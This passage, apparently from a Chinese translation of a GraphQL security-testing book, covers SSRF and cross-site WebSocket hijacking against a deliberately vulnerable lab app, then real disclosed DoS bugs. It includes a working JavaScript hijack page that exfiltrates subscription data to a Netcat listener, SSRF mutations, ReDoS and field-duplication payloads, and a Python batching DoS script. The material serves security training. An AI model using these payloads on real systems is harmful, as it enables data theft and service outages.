  \ 80 上的 TCP 连接。这可能表明应用程序正在尝试访问攻击者控制的服务器。\n\n确定盲 SSRF 存在的另一种方法是通过时序分析。攻击者可以在攻击者控制的服务器返回的\
  \ HTTP 响应中引入人为的延迟，然后根据易受攻击的应用程序返回响应的时间来确定攻击是否成功。\n\n\n\n\n\n正如名称所示，半盲 SSRF 会提供一些证据，但并非完全表明存在\
  \ SSRF 漏洞。信息可能包括错误或部分服务器响应。想象一下，攻击者尝试向图像获取服务提交各种内部 URL，以尝试发现主机所在的网络。例如，他们可能会提交 http://10.10.0.254/index.html\
  \ 或 http://172.12.0.254/index.html。在成功尝试中，应用程序可能会发送一封没有附件的电子邮件，而在失败尝试中，则根本不会发送电子邮件。\n\
  \n作为渗透测试人员，你希望发现的 SSRF 的最后一种类型是非盲 SSRF（也称为全读 SSRF），其中服务器向攻击者返回完整的响应，表明存在 SSRF 漏洞。在图像获取服务的示例中，提供非基于图像的\
  \ URL 给应用程序后，我们可能会看到完整的 HTTP 响应。\n\n## 搜索易受攻击的操作、字段和参数\n\n在测试 GraphQL 服务器是否存在 SSRF\
  \ 时，检查所有可能的操作，无论它们是突变还是查询。正如你可能预期的那样，SSRF 通常会影响一个或多个接受值（如标量）的易受攻击的 GraphQL 参数。\n\
  \n同时也要密切关注 GraphQL 字段名称，以了解它们的设计用途。例如，字段名称中包含 fetch、import、download 或 read 等动词，都可能意味着服务器执行某种操作，例如从某处读取或获取资源。除了字段名称之外，某些参数名称也可能暗示服务器正尝试执行出站连接以解析查询。以下是一些示例：\n\
  \n- ip\n- url\n- host\n- network\n- domain\n- site\n- target\n- fetch\n- img_url\n\
  - target_url\n- remote_url\n\n这是一个部分列表，但它应该能让你了解哪些关键字可能是有提示性的。\n\n## 测试 SSRF\n\n\
  让我们继续使用 Burp Suite 在 DVGA 中测试 SSRF 漏洞。点击 Open Browser 打开内置浏览器。然后，快速浏览 DVGA 的 Web\
  \ 界面。有没有什么是显眼的？比如 Import a Paste 页面，如图 9-6 所示？\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_262_0.png)\n\
  \n图 9-6：DVGA 的 Import a Paste 页面\n\nImport from URL 表单接受一个 URL 并尝试从中导入粘贴内容。要查看提交\
  \ URL 时会发生什么，请在 Burp Suite 中打开 Intercept 模式，在搜索栏中输入任意 URL，然后点击 Submit。 （这里有一个你可以导入的示例粘贴：https://pastebin.com/raw/LQ6u1qyi。）你应该会在\
  \ Burp 中看到如下请求：\n\n```\nPOST /graphql HTTP/1.1\nHost: localhost:5013\nContent-Length:\
  \ 302\nAccept: application/json\nContent-Type: application/json\nUser-Agent: Mozilla/5.0\
  \ (Windows NT 10.0; Win64; x64)\nAppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45\
  \ Safari/537.36\n--snip--\nOrigin: http://localhost:5013\nReferer: http://localhost:5013/import_paste\n\
  Accept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: env=graphql:disable\n\
  Connection: close\n\n{\"query\":\"mutation ImportPaste ($host: String!, $port: Int!,\
  \ $path: String!, $scheme: String!) {\\n        importPaste(host: $host, port: $port,\
  \ path: $path, scheme: $scheme) {\\n            result\\n        }\\n}\",\"variables\"\
  :{\"host\":\"pastebin.com\",\"port\":443,\"path\":\"/raw/LQ6u1qyi\", \"scheme\"\
  :\"https\"}}\n```\n\n正如你所见，该请求使用 importPaste 突变，它接受四个参数：host、port、path 和 scheme。POST\
  \ JSON 有效负载包含 variables 键，以将 URL 组件（值）传递给这些参数。\n\n在幕后，DVGA 使用 URL 作为 HTTP GET 请求的一部分，读取响应并将其添加到其粘贴数据库中。要查看导入的内容，请在\
  \ Burp Suite 中点击 Forward 按钮将请求发送到 GraphQL 服务器，关闭 Intercept 模式，然后转到 Private Pastes\
  \ 页面。\n\n在底层，GraphQL 发出了 HTTP 调用以从 URL 检索此内容。这种类型的功能明显表明存在 SSRF！让我们手动探索相同的 GraphQL\
  \ 查询，改变一些值。突变如清单 9-7 所示。\n\n```\nmutation {\n  importPaste(scheme: \"https\", host:\"\
  pastebin.com\", port:443, path:\"/raw/LQ6u1qyi\") {\n    result\n  }\n}\n```\n\n\
  清单 9-7：importPaste 突变\n\n仔细观察，四个参数构成了 GraphQL 将构造的 URL 的构建块（在本例中为 https://pastebin.com:443/raw/LQ6u1qyi）。如果我们可以使用\
  \ HTTP（或 HTTPS）方案并提供我们想要的任何域名和端口，就没有什么能阻止我们四处探查 DVGA 网络上的其他服务，对吧？\n\n让我们看看当我们指定内部\
  \ URL 而不是外部 URL 时会发生什么。在清单 9-8 中，我们指定了不同的 URL 目标以从中导入粘贴内容。突变将强制 DVGA 通过向 http://localhost:8080/paste.txt\
  \ 发出 HTTP 请求来导入粘贴内容。请注意，虽然 localhost 是一个有效的 host，但端口 8080 在 DVGA 容器上未打开。因此，此请求不会返回任何有意义的内容。\n\
  \n```\nmutation {\n  importPaste(scheme: \"http\", host:\"localhost\", port:8080,\
  \ path:\"/paste.txt\") {\n    result\n  }\n}\n```\n\n清单 9-8：importPaste 突变的恶意版本\n\
  \n运行突变后，你应该会从 Altair 看到此响应：\n\n```\n{\n  \"data\": {\n    \"importPaste\": {\n \
  \     \"result\": \"\"\n    }\n  }\n}\n```\n\n服务器返回一个空的结果对象值。我们能够在 Altair 中相当快地获得此响应。\
  \ （在我们的实验室中，我们在 100 毫秒内收到了它。）因此，我们现在知道，如果我们探测一个未打开的端口，我们会立即得到一个没有数据的结果，而 result\
  \ JSON 键中没有数据。\n\n接下来，让我们通过探测确实存在的服务来模拟 SSRF 漏洞。为了在 DVGA 容器上模拟额外的服务，我们将使用 Netcat。首先，通过在\
  \ Kali 的终端中运行以下 Docker 命令，在 DVGA 容器中启动 Netcat 侦听器：\n\n```\n# sudo docker exec -it\
  \ dvga nc -lvp 7773\n\nlistening on [::]:7773 ...\n```\n\n接下来，我们将构造一个有效负载，以向 Netcat\
  \ 正在绑定的端口（7773）发送 HTTP 探测，如清单 9-9 所示。\n\n```\nmutation {\n  importPaste(scheme:\
  \ \"http\", host:\"localhost\", port:7773, path: \"/ssrf\") {\n    result\n  }\n\
  }\n```\n\n清单 9-9：滥用 SSRF 漏洞的突变查询\n\n如果你发送此查询，你应该会在 Netcat 侦听器中看到与清单 9-10 类似的输出。\n\
  \n```\nconnect to [::ffff:127.0.0.1]:7773 from localhost:55554 ([::ffff:127.0.0.1]:55554)\n\
  GET /ssrf HTTP/1.1\nHost: localhost:7773\nUser-Agent: curl/7.83.1\nAccept: */*\n\
  ```\n\n清单 9-10：DVGA 请求到达内部服务\n\n这表明 DVGA 向一个内部、未暴露的端口发出了 GET 请求。请注意，Kali 机器无法直接访问此端口；我们使用\
  \ DVGA 本身来访问它，这说明了 SSRF 漏洞如何使攻击者能够访问他们否则无法直接访问的服务。这种 SSRF 攻击更具体地说是跨站端口攻击（XSPA），它属于\
  \ SSRF 漏洞类别。\n\n你可能还注意到，Altair 在发送清单 9-10 中的 importPaste 突变后会挂起。这是因为我们打开的 Netcat\
  \ 侦听器不会返回响应，但 Altair 会等待 GraphQL API 的响应。这实际上是一种盲 SSRF，因为作为攻击者，我们无法直接访问响应；我们所知道的只是当我们探测一个打开的端口时客户端会挂起。你可以通过按\
  \ CTRL-C 关闭 Netcat 侦听器。Altair 的状态应恢复正常。\n\n## 防止 SSRF\n\n为了确定应用程序是否可能容易受到 SSRF 攻击，我们可以问自己这个问题：客户端是否控制\
  \ API 流使用的任何目标 URL？SSRF 大多涉及通过将目标 URL 指向意外的受限内部或外部位置来操纵它们。以下是一些保护策略：\n\n- **输入验证。**\
  \ 允许拒绝传递给作为查询或突变一部分接受 URL 的 GraphQL 参数的危险字符。确保只接受授权的 URL，并有助于降低 SSRF 风险。\n- **网络分段。**\
  \ 通过确保应用程序只能与相关的内部网络通信来帮助最大程度地降低风险。你在暂存网络中的易受攻击的 GraphQL API 不应能够访问你在生产网络中的另一个 GraphQL\
  \ API。\n- **威胁建模。** 允许在 GraphQL API 的开发生命周期早期识别潜在风险，更具体地说是具有可能容易受到 SSRF 攻击的查询或突变。\n\
  - **最小权限原则。** 有助于最大程度地减少影响范围。确保 GraphQL 运行的实例没有过于宽松的权限，并且无法在应用程序之间执行特权操作。\n\n在下一节中，我们将转向讨论影响\
  \ GraphQL 订阅的基于劫持的漏洞。\n\n## 跨站 WebSocket 劫持\n\n如果攻击者可以通过获取授予应用程序特殊权限的会话 cookie 来劫持用户的会话，他们就可以使用受害者的权限执行操作并访问其敏感数据。CSWSH\
  \ 是一种影响 WebSocket 通信握手部分的 CSRF 漏洞，该通信使用基于 cookie 的身份验证。由于 GraphQL API 可以使用 WebSocket\
  \ 进行订阅操作，因此它们有风险容易受到 CSWSH 影响。\n\n在第 3 章中，我们展示了使用 WebSocket 在 GraphQL 客户端和服务器之间使用订阅进行通信时发送的握手请求和响应。客户端通过\
  \ HTTP 发起这些 WebSocket 握手，如果 WebSocket 服务器实现身份验证，则可能包含如下 cookie：\n\n```\nCookie:\
  \ session=somesessionID\n```\n\n当 WebSocket 连接握手不包含防止攻击者执行跨源请求的反 CSRF 令牌时，就会发生 CSWSH。当不存在此类令牌时，攻击者很容易\n\
  \n\n\n开发专门的代码，代表受害者伪造 WebSocket 消息并使用其已认证的会话。\n\n除了反 CSRF 令牌之外，WebSocket 服务器还应验证\
  \ WebSocket 握手请求中的 Origin 头。Origin 头具有重要的安全功能，因为它标识了请求的来源。如果服务器不检查此头，就无法知道握手请求是否被伪造。任何具有未经授权来源的握手都应返回\
  \ 403 Forbidden 响应代码，而不是 101 Switching Protocols。\n\n## 查找订阅操作\n\nCSWSH 漏洞存在于传输协议层，因此不是\
  \ GraphQL 本身的缺陷。在 GraphQL 的上下文中，你只有在 GraphQL API 使用订阅来执行实时更新时才会遇到它们。因此，为了测试 CSWSH，我们首先需要知道目标应用程序是否有任何订阅相关字段。为了发现这一点，我们可以使用一个依赖于\
  \ subscriptionType 来获取字段名称的 introspection 查询，如清单 9-11 所示。\n\n```\nquery {\n  __schema\
  \ {\n    subscriptionType {\n      fields {\n        name\n      }\n    }\n  }\n\
  }\n```\n\n清单 9-11：使用 introspection 获取订阅字段名称\n\n如果你在 Altair 中针对 DVGA 运行此查询，你应该会注意到模式中有一个名为\
  \ paste 的字段，订阅操作可以使用它。\n\n## 劫持订阅查询\n\n现在让我们劫持一个订阅查询并外泄其响应。为了模拟此攻击，我们将按以下步骤操作。从攻击者的角度来看，我们将在端口\
  \ 4444 上打开一个 Netcat TCP 监听器，在那里接收外泄的响应。接下来，从受害者的角度来看，我们将模拟用户因社会工程攻击而受害，通过将 HTML\
  \ 文件拖放到浏览器中使其加载 JavaScript 代码，劫持用户的会话以执行 WebSocket 握手并订阅 paste 事件。我们还将在 DVGA 中创建一个新的\
  \ paste 以供订阅查询接收。这将模拟受害者可能有权访问但攻击者不应访问的网站活动。最后，我们将读取 Netcat 获取的外泄响应。\n\n让我们首先通过检查底层代码来了解攻击模式。保存\
  \ CSWSH 劫持代码 https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch09/websockets_hijack.html\
  \ 到你的桌面。确保文件名具有 .html 扩展名。清单 9-12 显示了代码。\n\n```\n<html>\n<h2>WebSockets Hijacking\
  \ and GraphQL Subscription Response Exfiltration Demo</h2>\n</html>\n\n<script>\n\
  const GQL = {\nCONNECTION_INIT: 'connection_init',\nCONNECTION_ACK: 'connection_ack',\n\
  CONNECTION_ERROR: 'connection_error',\nCONNECTION_KEEP_ALIVE: 'ka',\nSTART: 'start',\n\
  STOP: 'stop',\nCONNECTION_TERMINATE: 'connection_terminate',\nDATA: 'data',\nERROR:\
  \ 'error',\nCOMPLETE: 'complete'\n}\n\nws = new WebSocket('ws://localhost:5013/subscriptions');\n\
  ws.onopen = function start(event) {\nvar query = 'subscription getPaste {paste {\
  \ id title content ipAddr userAgent public owner {name} }}';\n\nvar graphqlMsg =\
  \ {\ntype: GQL.START,\npayload: {query}\n};\nws.send(JSON.stringify(graphqlMsg));\n\
  }\nws.onmessage = function handleReply(event) {\ndata = JSON.parse(event.data)\n\
  fetch('http://localhost:4444/?'+ JSON.stringify(data), {mode: 'no-cors'});\n}\n\
  </script>\n```\n\n清单 9-12：执行 WebSocket 劫持的 JavaScript 代码\n\n我们在 ① 处初始化一个新的 WebSocket\
  \ 对象并指定 DVGA 的订阅 URL。在 ② 处，我们声明一个包含订阅查询的 query 变量。此查询订阅 paste 事件并获取诸如 id、title、content、ipAddr、userAgent、public\
  \ 和所有者名称等字段。在 ③ 处，我们通过 WebSocket 协议发送包含此查询的 JSON 字符串。消息发送后，当接收到传入的 WebSocket 消息时，ws.onmessage\
  \ 事件处理程序将被调用。此处理程序将把消息解析为 JSON 对象 ④。一旦消息被解析，代码在 ⑤ 处将通过使用 GET URL 参数将响应外泄到目标（在本例中为\
  \ http://localhost:4444）。\n\n让我们开始吧！在终端窗口中，运行以下命令以启动 Netcat 监听器：\n\n```\n# nc -vlp\
  \ 4444\n```\n\nlistening on [any] 4444 ...\n\n我们传递给 Netcat 的 -v l p 标志告诉它以侦听模式 (-l)\
  \ 在详细模式 (-v) 下监听端口 (-p) 4444。接下来，打开一个浏览器窗口并将你之前下载的 HTML 文件拖放到浏览器的窗口中。你应该会看到图 9-7\
  \ 所示的页面。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_268_0.png)\n\n图 9-7：WebSocket\
  \ 劫持演示\n\n接下来，打开另一个浏览器窗口并点击左侧的 Create Paste 以打开 http://localhost:5013 上的 Create\
  \ a Paste 页面。输入你能识别的标题和你的消息，如图 9-8 所示。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_268_1.png)\n\
  \n图 9-8：DVGA 中的 paste 创建\n\n接下来，点击 Submit，并密切关注 Netcat 正在运行的终端窗口。你应该会看到类似这样的输出：\n\
  \n```\nlistening on [any] 4444 ...\nconnect to [127.0.0.1] from localhost [127.0.0.1]\
  \ 50198\nGET /?{%22type%22:%22data%22,%22payload%22:{%22data%22:{%22paste%22:{%22id%22:%22%2214%22,%22title%22:%22This%20will%20get%20exfiltrated!%22,%22content%22:%22Exfiltrated%20Data%22,%22ipAddr%22:%22172.17.0.1%22,%22userAgent%22:%22Mozilla/5.0%20(Windows%20NT%2010.0;%20Win64;%20x64)%20AppleWebKit/537.36%20(KHTML,%20like%20Gecko)%20Chrome/96.0.4664.45%20Safari/537.36%22,%22public%22:true,%22owner%22:{%22name%22:%22DVGAUser%22}}}}\
  \ HTTP/1.1\nHost: localhost:4444\nsec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\"\
  ;v=\"96\"\nsec-ch-ua-mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64;\
  \ x64)\nAppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\n\
  sec-ch-ua-platform: \"Linux\"\nAccept: */*\nSec-Fetch-Site: cross-site\nSec-Fetch-Mode:\
  \ no-cors\nSec-Fetch-Dest: empty\nAccept-Encoding: gzip, deflate\nAccept-Language:\
  \ en-US,en;q=0.9\nConnection: close\n```\n\nNetcat 从受害者那里接收到包含外泄 paste 数据的 GET 请求。你可以看到请求的\
  \ URL 参数以 /?{%22type 开头。有效载荷是 URL 编码的，但当你对其进行解码时，你可以立即看出它是使用 DVGA 用户界面创建的 paste\
  \ 数据。你可以使用 https://meyerweb.com/eric/tools/dencoder 等网站或使用终端中的 Python 进行此 URL 解码，如清单\
  \ 9-13 所示。\n\n```\n# echo 'ADD-STRING-HERE' | python3 -c \"import sys;\nfrom urllib.parse\
  \ import unquote; print(unquote(sys.stdin.read()));\"\n```\n\n清单 9-13：使用 Python\
  \ 进行 URL 解码\n\n我们通过强制客户端访问攻击者控制的网站来外泄数据，在该网站上，自定义代码发送伪造的跨站 WebSocket 消息并将其响应外泄到远程\
  \ Netcat 监听器。\n\n## 防止 CSWSH\n\n由于 CSWSH 是一种 CSRF 攻击，你可以通过使用 CSRF 缓解技术来防止它。使用除 cookie\
  \ 之外的其他形式的身份验证来验证客户端的 WebSocket 服务器，例如 JWT，也可以提供保护。当服务器使用 JWT 令牌时，跨站 WebSocket 消息将无法在没有适当头的情况下进行身份验证，导致握手失败。\n\
  \n验证 Origin 头对于防止 CSWSH 攻击也至关重要，从黑客的角度来看，测试此验证是否存在绕过是值得的。服务器可能会以奇怪的方式检查头。例如，如果应用程序仅允许\
  \ origin *example.com*，攻击者可能会尝试创建一个使用它作为其子域的域，如 *example.com.attacker.net*。如果服务器以天真的方式验证\
  \ Origin 头（例如，通过检查字符串 *example.com*），此类攻击可能会通过验证逻辑。\n\n## 总结\n\n在本章中，你了解了影响 GraphQL\
  \ API 消费者和服务器的攻击。使用基于 GET 和 POST 的 CSRF，攻击者可以代表客户端伪造查询和变更。通过使用 CSWSH 劫持 WebSocket\
  \ 通信，攻击者可以外泄 GraphQL 订阅响应。最后，SSRF 允许攻击者代表服务器伪造请求并可能访问内部资源。\n\n\n\n\n\n# 10 已披露的漏洞和利用\n\
  \n![](img/2f244b00cd9f8f37cfc22f928aaa471a_272_0.png)\n\n本章致力于探索真实世界的黑客报告。这些此前发现的\
  \ GraphQL 漏洞和利用将强化本书的部分经验教训，并希望能激发你进行自己的安全研究。\n\n在整本书中，你已经学习了在实验室环境中测试 GraphQL API\
  \ 的许多方法。但在真实场景中，你可能会遇到针对你进行测试的应用独有的漏洞。在本章中，你将发现某些漏洞可能有多么具体。每当你学习一项新技术时，回顾公开可用的黑客报告都有诸多优势。本章将很有用，因为你将发现以下内容：\n\
  \n- 社区其他人提供的新黑客技术\n- 其他黑客公开披露漏洞的方法，包括其报告的技术深度，以及如何与外部公司沟通、评估漏洞的严重性并证明其实际业务影响\n-\
  \ 识别公司最关心的软件弱点的方法\n- 真实 GraphQL 应用的设计和实现，以及公司在其生产环境中定期处理的漏洞类型\n- 公司对漏洞缓解的方法，因为为软件安全缺陷找到长期缓解策略与知道如何破坏软件一样重要\n\
  \n正如你将看到的，每当你学习新东西时，有很大可能其他人已经做了一些工作，可以让你领先一步。\n\n## 拒绝服务\n\n在本节中，我们将回顾公开披露的报告，这些报告对众多公司（其中一些你甚至可能熟悉）的\
  \ API 造成了 DoS 影响。记住第 5 章中提到的内容，DoS 漏洞在 GraphQL 中相当常见，这是因为查询语言的强大功能。让我们探索这些问题对服务器可能造成多大的影响。\n\
  \n### 大型负载（HackerOne）\n\nHackerOne 的漏洞赏金平台在其生产环境中大量使用 GraphQL。除了托管其他公司的漏洞赏金计划外，它还运行自己的计划，黑客可以使用该计划披露在平台中发现的安全问题。\n\
  \n> NOTE 你可以在 https://hackerone.com/security 找到 HackerOne 计划。\n\n2020 年 5 月，一名黑客披露了此类漏洞（https://hackerone.com/reports/887521）。他们发现，尽管\
  \ HackerOne 文档表明 API 的查询输入存在字符限制，但实际上并未执行此限制。\n\n为了测试该漏洞，黑客编写了一个基于 Python 的利用脚本（包含在报告中），执行以下操作：\n\
  \n- 1. 设置必要的 HTTP 请求信息，例如 cookie 和授权头。\n- 2. 初始化一个空字符串变量 a。\n- 3. 执行 15,000 次的 for\
  \ 循环并向 a 添加一个字符字符串，有效地创建了一个 15,000 个字符的字符串。\n- 4. 执行另一次 50 次的 for 循环以发送使用 CreateStructuredScope\
  \ 字段的 mutation 查询。此字段使用前一步构建的有效负载 10 次，有效地为字段的 instruction 参数提供一个包含 150,000 个字符的值。\n\
  \n5. 输出服务器返回对客户端查询响应的耗时。此值用作衡量查询对服务器可能性能影响的指标。响应时间越慢，服务器性能下降就越明显。\n\n以下是利用脚本中使用的\
  \ mutation 的片段。利用脚本构建的大型负载作为 mutation 的一部分替换 $instruction 占位符：\n\n```\n--snip--\n\
  mutation ($eligible_for_submission: Boolean, $instruction: String)\n{\n  createStructuredScope(input:\
  \ {$eligible_for_submission, instruction: $instruction})\n  {\n    --snip--\n  }\n\
  }\n--snip--\n```\n\n向服务器发送此 mutation 证明是有效的。在黑客发送了几个此类请求后，GraphQL 服务器开始出现困难，返回 HTTP\
  \ 服务器错误 500 Internal Server Error、502 Bad Gateway 和 504 Gateway Timeout，有效地造成了 DoS。500\
  \ 级别的 HTTP 响应代码是服务器端错误，表示代理或服务器出现问题。\n\n请记住，DoS 漏洞不一定需要完全使服务器离线才能生效。它们也可以消耗大量资源，导致明显的性能下降。\n\
  \nHackerOne 为负责任披露此报告的黑客授予了 2,500 美元的赏金。\n\n### 正则表达式（CS Money）\n\n第 5 章未涵盖的一种 DoS\
  \ 形式使用正则表达式（regex）。正则表达式 DoS（ReDoS）通过迫使服务器处理一个恶意的正则表达式模式来耗尽服务器，其评估消耗大量时间和资源。这些漏洞并非特定于\
  \ API，尽管它们可能存在于所有 API 技术中，包括 REST、SOAP 和 GraphQL。\n\nReDoS 漏洞可能以各种方式发生：\n\n- 客户端将恶意正则表达式模式作为输入提供给服务器。\n\
  - 服务器包含一个正则表达式逻辑模式，当提供匹配输入时可能导致无限评估，并且客户端提供了此类输入。如果输入异常大，则可能发生 ReDoS。\n\n这里有一个可能容易受到\
  \ ReDoS 攻击的正则表达式模式示例：(a+)+。此模式可以匹配包含任意数量字母 a 的任何字符串，例如 aaaaaaaaaaaaaaaaaaaa。如果客户端发送了\
  \ 100,000 个 a 字符的大型负载，服务器在模式被评估时可能会变慢。\n\n你可以使用在线正则表达式测试网站，如 https://regex101.com\
  \ 来查看特定表达式在实践中的行为，如图 10-1 所示。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_275_0.png)\n\
  \n图 10-1：https://regex101.com 上的在线正则表达式测试器\n\n2020 年 10 月，一个化名为 mvm 的道德黑客向 CS Money\
  \ 的漏洞赏金计划报告了 GraphQL API 中的 ReDoS 漏洞（https://hackerone.com/reports/1000567）。黑客发现\
  \ GraphQL search 对象接受一个 q（query）参数。在他们的测试中，他们将 Unicode 空值（\\u0000）插入为其值：\n\n```\n\
  query {\n  search(q: \"\\u0000\", lang: \"en\") {\n    --snip--\n  }\n}\n```\n\n\
  作为对该查询的响应，GraphQL API 服务器返回了一个有趣的错误，揭示了一些对于识别 ReDoS 漏洞存在至关重要的信息：\n\n```\n\"errors\"\
  : [\n  {\n    \"message\": \"value (?.*\\u0000) must not contain null bytes\"\n\
  \    --snip--\n  }\n]\n```\n\n正如你所见，通过 q 参数提供的字符串被插入到服务器上的正则表达式匹配逻辑中，由响应中前面的 (?=.*\
  \ 字符串所示。服务器可能使用此参数在数据库中搜索相关数据。\n\n方便的是，服务器已通过其 extensions 启用了查询追踪。查询追踪允许 GraphQL\
  \ 服务器返回用于调试的有用响应元数据，并提供有关查询性能的信息。响应中的追踪信息向客户端披露了三个有用的字段（startTime、endTime 和 duration），揭示了服务器处理查询所花费的时间：\n\
  \n```\n\"extensions\": {\n  \"tracing\": {\n    \"startTime\": \"02:07:55.251\"\
  ,\n    \"endTime\": \"02:07:55.516\",\n    \"duration\": 264270190,\n    --snip--\n\
  \  }\n}\n```\n\n这些字段也表明，有时看似无害的信息可以帮助我们在渗透测试期间。始终查看细节。\n在识别出潜在漏洞后，黑客随后使用了一个恶意的正则表达式模式并将其设置为\
  \ q 参数的值：\n\n```\nquery {\n  search(q: \"[a-zA-Z0-9]+\\\\s?+$|^([a-zA-Z0-9-'.\\\\\
  w\\\\W]+\\\\s?)+$\\\\\", lang: \"en\"){\n    --snip--\n  }\n}\n```\n\n此模式将匹配 a 到\
  \ z、A 到 -Z 和 0 到 9 范围内的任何字符。\n\n> NOTE\n> 要获取此模式的完整解释，请将其插入到在线正则表达式评估器中，例如 https://regex101.com，它将提供详细的解释说明其作用。\n\
  \n这里最重要的收获是，此模式很可能匹配应用程序后端数据库中的许多字符串，导致服务器处理（并可能返回）大量数据。在他们的报告中，黑客分享了一个使用 GraphQL\
  \ 查询的 proof-of-concept cURL 命令。他们表明，通过运行 100 次，他们能够完全关闭 GraphQL 服务器。\n\n正如你所见，恶意负载可以关闭服务器。我们强烈不建议在未经公司明确授权的情况下向公司的生产\
  \ API 发送恶意负载，因为如果公司无法处理恶意负载，它们可能会对业务产生负面影响。\n\n公司为此报告授予了 250 美元的赏金。\n\n### 循环自省查询（GitLab）\n\
  \n以下漏洞于 2019 年 7 月报告给 GitLab（https://gitlab.com/gitlab-org/gitlab/-/issues/30096）。此漏洞利用了\
  \ GraphQL 自省查询中 type 和 field 字段之间的循环关系。\n\n\n\n\n\n记者，其 handle 为 freddd，识别出可以通过使用\
  \ __schema meta-field 调用 types，然后递归调用 fields 和 type 来触发 DoS 条件：\n\n```\nquery {\n\
  \  __schema {\n    types {\n      fields {\n        type {\n          fields {\n\
  \            type {\n              --snip--\n            }\n          }\n      \
  \  }\n      }\n    }\n  }\n}\n```\n\n此查询依赖于 API 上启用了 introspection。当 introspection\
  \ 被禁用时，通常无法直接调用 __schema meta-field。\n\n尽管 GitLab 已实施查询复杂度检查以减轻基于循环查询的 DoS 攻击，但该控制不适用于\
  \ introspection 查询，从而使其无意中仍然存在漏洞。\n\n利用此漏洞也不要求黑客对 GraphQL API 进行身份验证。身份验证的缺失使其更严重，因为它降低了能够利用它的人的门槛。\n\
  \n## 别名用于字段重复（Magento）\n\nMagento 是互联网上最受欢迎的电子商务平台之一，使用 GraphQL，并且在 2021 年 4 月，该平台受到了\
  \ DoS 漏洞的影响。使用字段重复，攻击者可以在未经身份验证的情况下耗尽服务器资源。（Magento 允许未经身份验证的客户端使用某些 GraphQL 对象，而其他对象则需要有效的经过身份验证的会话。）\n\
  \n我们，本书的作者，发现 Magento 没有对其自身进行保护，以防止恶意查询多次重复字段。我们使用了以下查询作为概念验证：\n\n```\nquery {\n\
  \  alias1: countries {\n    full_name_english\n    full_name_english # continues\
  \ 1000s of times\n    --snip--\n  }\n  alias2: countries {\n    --snip--\n  }\n\
  }\n```\n\n```\nalias3: countries {\n  --snip--\n}\n}\n```\n\n此查询使用 GraphQL 别名作为一种方法，在单个\
  \ HTTP 请求中批量重复查询，这种技术允许攻击者向服务器发送非常复杂的查询。由于缺乏安全控制，例如查询成本限制，它有效地耗尽了服务器的资源。\n\nMagento\
  \ 此后已在其平台中引入了许多 GraphQL 安全功能，例如 GraphQL 查询复杂度限制和查询深度分析。图 10-2 显示了 Magento 在其 API\
  \ 中实施的安全控制的默认值。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_278_0.png)\n\n图 10-2：Magento\
  \ 查询复杂度和查询深度控制的默认值\n\n正如你所见，Magento 已实施了 queryComplexity 值为 300 和 queryDepth 值为\
  \ 20，这意味着查询的复杂度不能超过 300，循环查询的嵌套层数不能超过 20 级。\n\n## 基于数组的批处理用于字段重复（WPGraphQL）\n\n\
  此漏洞与我们之前讨论的字段重复漏洞非常相似。在 2021 年 4 月，WPGraphQL，一个用于 WordPress 的 GraphQL 插件（https://www.wpgraphql.com），由于缺乏适当的安全控制和不安全默认配置而遭受了\
  \ DoS 漏洞。\n\nWPGraphQL 插件为任何 WordPress 内容管理系统提供生产就绪的 GraphQL API，并且可通过 WordPress\
  \ 插件市场获得。图 10-3 显示了此插件。\n\n默认情况下，WPGraphQL 基本上使任何安装了该插件的 WordPress 实例都容易受到 DoS 攻击。首先，它允许客户端使用基于数组的批处理在单个请求中批处理多个查询。此外，插件对恶意查询的保护有限。第三，由于\
  \ WordPress 是一个经常为未经身份验证的客户端（例如博客读者）提供服务的博客平台，API 的某些功能部分可以在没有特殊权限的情况下访问。\n\n![](img/2f244b00cd9f8f37cfc22f928aaa471a_279_0.png)\n\
  \n图 10-3：用于 WordPress 的 WPGraphQL 插件\n\n我们自己发现了此漏洞并发布了以下利用代码：\n\n```\n--snip--\n\
  FORCE_MULTIPLIER = int(sys.argv[2])\nCHAINED_REQUESTS = int(sys.argv[3])\n\n--snip--\n\
  queries = []\n\npayload = 'content \\n comments { \\n nodes { \\n content } }' *\
  \ FORCE_MULTIPLIER\nquery = {'query':'query { \\n posts { \\n nodes { \\n ' + payload\
  \ + ' } } }'}\n\nfor _ in range(0, CHAINED_REQUESTS):\n    queries.append(query)\n\
  \nr = requests.post(WORDPRESS_URL, json=queries)\nprint('Time took: {}'.format(r.elapsed.total_seconds()))\n\
  ```\n\n此代码设置了两个变量，这些变量本质上定义了单个 HTTP 请求的复杂性：FORCE_MULTIPLIER 是一个整数变量，用于重复字段的选择集，CHAINED_REQUESTS\
  \ 保存了利用程序将添加到批处理数组中的元素数量。\n\n接下来，queries 变量被设置为空数组。此变量将保存最终发送到 WPGraphQL 的完整恶意负载。代码随后创建一个特殊查询，该查询将由分配给\
  \ FORCE_MULTIPLIER 变量的整数值重复，并将其制作成 HTTP 请求的查询 JSON 对象。接下来，循环运行 N 次，其中 N 是 CHAINED_REQUESTS\
  \ 的值。如果 CHAINED_REQUESTS 设置为 100，循环将运行 100 次并创建一个包含 100 个元素的数组。最后，\n\n利用程序发送 HTTP\
  \ 请求并计算服务器响应昂贵查询所需的时间。\n\n简而言之，如果 FORCE_MULTIPLIER 和 CHAINED_REQUESTS 都设置为 100，最终数组将包括\
  \ 100 个查询，每个查询包含 100 个重复字段。想象一下，如果这两个变量设置为 10,000，这种查询的处理会多么昂贵。\n\n> NOTE 自披露以来，WPGraphQL\
  \ 已对插件进行了重大的安全改进，并解决了此 DoS 漏洞。\n\n## 循环片段（Agoо）\n\n我们在 2022 年 5 月在名为 Agoo 的基于 Ruby\
  \ 的 GraphQL 服务器实现中发现了一个循环片段漏洞。由 CVE-2022-30288 识别，该漏洞源于 Agoo 服务器级别上对传入查询的验证检查缺失。这种验证失败意味着服务器不符合规范。它还意味着发送到\
